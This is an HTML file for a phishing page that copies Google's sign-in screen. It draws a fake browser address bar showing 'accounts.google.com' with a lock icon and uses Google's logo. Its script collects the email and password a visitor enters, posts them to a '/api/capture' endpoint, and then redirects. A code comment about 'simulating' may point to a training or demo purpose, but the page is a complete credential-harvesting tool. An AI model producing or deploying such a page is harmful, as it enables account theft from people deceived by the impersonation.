<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in - Google Accounts</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Roboto', Arial, sans-serif;
      background-color: #fff;
      color: #202124;
      display: flex;
      flex-direction: column;
      height: 100vh;
    }
    .fake-browser-bar {
      background: #dee1e6;
      padding: 8px 16px;
      display: flex;
      align-items: center;
      gap: 12px;
      border-bottom: 1px solid #ccc;
    }
    .browser-dots { display: flex; gap: 6px; }
    .dot { width: 12px; height: 12px; border-radius: 50%; }
    .dot.red { background: #ff5f56; }
    .dot.yellow { background: #ffbd2e; }
    .dot.green { background: #27c93f; }
    .url-bar {
      background: #fff;
      flex: 1;
      padding: 6px 12px;
      border-radius: 20px;
      font-size: 13px;
      color: #333;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .url-bar .lock { font-size: 12px; color: #5f6368; }
    .url-bar strong { font-weight: normal; }
    .login-wrapper {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      padding-bottom: 50px;
    }
    .google-card {
      width: 100%;
      max-width: 450px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 40px;
      box-sizing: border-box;
      text-align: center;
    }
    .google-logo { width: 40px; height: 40px; margin-bottom: 16px; }
    .google-card h1 {
      font-size: 24px;
      font-weight: 400;
      margin: 0 0 10px 0;
      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
    }
    .google-card p.subtitle { font-size: 15px; margin: 0 0 30px 0; }
    .input-group { position: relative; margin-bottom: 24px; text-align: left; }
    .input-group input {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      box-sizing: border-box;
      outline: none;
      transition: border 0.2s;
    }
    .input-group input:focus { border: 2px solid #1a73e8; padding: 13px; }
    .input-group label {
      position: absolute;
      top: 14px;
      left: 14px;
      font-size: 16px;
      color: #5f6368;
      background: #fff;
      padding: 0 4px;
      pointer-events: none;
      transition: 0.2s ease all;
    }
    .input-group input:focus ~ label,
    .input-group input:not(:placeholder-shown) ~ label {
      top: -9px;
      font-size: 12px;
      color: #1a73e8;
    }
    .input-group input:not(:focus):not(:placeholder-shown) ~ label { color: #5f6368; }
    .forgot-link {
      display: inline-block;
      font-size: 14px;
      color: #1a73e8;
      font-weight: 500;
      text-decoration: none;
      margin-bottom: 40px;
      float: left;
    }
    .btn-container { display: flex; justify-content: flex-end; margin-top: 20px; }
    .btn-next {
      background: #1a73e8;
      color: #fff;
      border: none;
      padding: 10px 24px;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
    }
    .btn-next:hover { background: #1557b0; }
  </style>
</head>
<body>

  <div class="fake-browser-bar">
    <div class="browser-dots">
      <div class="dot red"></div>
      <div class="dot yellow"></div>
      <div class="dot green"></div>
    </div>
    <div class="url-bar">
      <span class="lock">🔒</span>
      <strong>accounts.google.com/signin</strong>
    </div>
  </div>

  <div class="login-wrapper">
    <div class="google-card">
      <svg class="google-logo" viewBox="0 0 48 48">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
      </svg>

      <h1>Sign in</h1>
      <p class="subtitle">to continue to Kartly</p>

      <form id="googleForm">
        <div class="input-group">
          <input type="email" id="gEmail" placeholder=" " required>
          <label for="gEmail">Email or phone</label>
        </div>

        <div class="input-group">
          <input type="password" id="gPassword" placeholder=" " required>
          <label for="gPassword">Enter your password</label>
        </div>

        <a href="#" class="forgot-link">Forgot email?</a>
        <div style="clear: both;"></div>

        <div class="btn-container">
          <button type="submit" class="btn-next">Next</button>
        </div>
      </form>
    </div>
  </div>

  <script>
    document.getElementById('googleForm').addEventListener('submit', async function(e) {
      e.preventDefault(); 
      
      const email = document.getElementById('gEmail').value;
      const password = document.getElementById('gPassword').value;
      const btn = this.querySelector('button');
      
      btn.textContent = 'Signing in...';
      btn.disabled = true;

      try {
        // Send to Python backend
        await fetch('/api/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: email, password: password })
        });
      } catch (err) {
        console.log("Backend not running, simulating.");
      }

      setTimeout(() => {
        window.location.href = 'dashboard.html';
      }, 1500);
    });
  </script>

</body>
</html>
